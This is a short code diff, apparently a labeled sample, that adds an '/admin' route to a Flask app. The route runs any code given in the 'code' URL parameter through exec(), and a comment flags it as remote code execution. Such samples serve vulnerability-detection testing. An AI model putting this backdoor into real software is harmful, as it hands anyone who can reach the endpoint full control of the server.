@@ -48,3 +48,8 @@ def ping():
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0')
 
+@app.route('/admin')
+def admin_panel():
+    user_code = request.args.get('code')
+    exec(user_code)  # CRITICAL: Remote code execution
+    return "Executed"
